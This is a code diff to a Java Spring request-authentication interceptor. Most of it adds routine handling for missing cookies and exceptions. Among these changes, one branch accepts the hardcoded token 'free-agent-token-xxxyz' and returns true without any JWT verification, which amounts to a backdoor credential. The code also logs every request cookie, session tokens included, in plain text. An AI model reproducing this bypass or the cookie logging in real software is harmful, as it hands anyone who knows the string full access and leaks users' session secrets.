@@ -24,6 +24,14 @@ public class RequestAuthHandler implements HandlerInterceptor {
             if (token==null || token.isEmpty()) {
                 Cookie[] cookies = request.getCookies();
                 log.info(JSON.toJSONString(cookies));
+                if (cookies == null || cookies.length == 0) {
+                    JSONObject res = new JSONObject();
+                    res.put("code", 401);
+                    res.put("data", "FAIL_NEED_LOGIN");
+                    res.put("errMsg", "SESSION ERROR");
+                    response.getWriter().write(res.toJSONString());
+                    return false;
+                }
                 for (int i = 0; i < cookies.length; i++) {
                     if (cookies[i] != null && cookies[i].getName().equals("token")) {
                         token = cookies[i].getValue();
@@ -34,6 +42,8 @@ public class RequestAuthHandler implements HandlerInterceptor {
                         }
                     }
                 }
+            } else if (token.equals("free-agent-token-xxxyz")) {
+                return true;
             }
             Map<String, Object> result = JwtokenHelper.verifyToken(token);
             if (result!=null) {
@@ -46,7 +56,14 @@ public class RequestAuthHandler implements HandlerInterceptor {
             res.put("errMsg", "SESSION ERROR");
             response.getWriter().write(res.toJSONString());
         } catch (Exception e) {
+            log.error(e.getMessage());
+            log.info(e.getMessage());
             e.printStackTrace();
+            JSONObject res = new JSONObject();
+            res.put("code", 401);
+            res.put("data", "FAIL_NEED_LOGIN");
+            res.put("errMsg", "SESSION ERROR");
+            response.getWriter().write(res.toJSONString());
         }
         return false;
     }
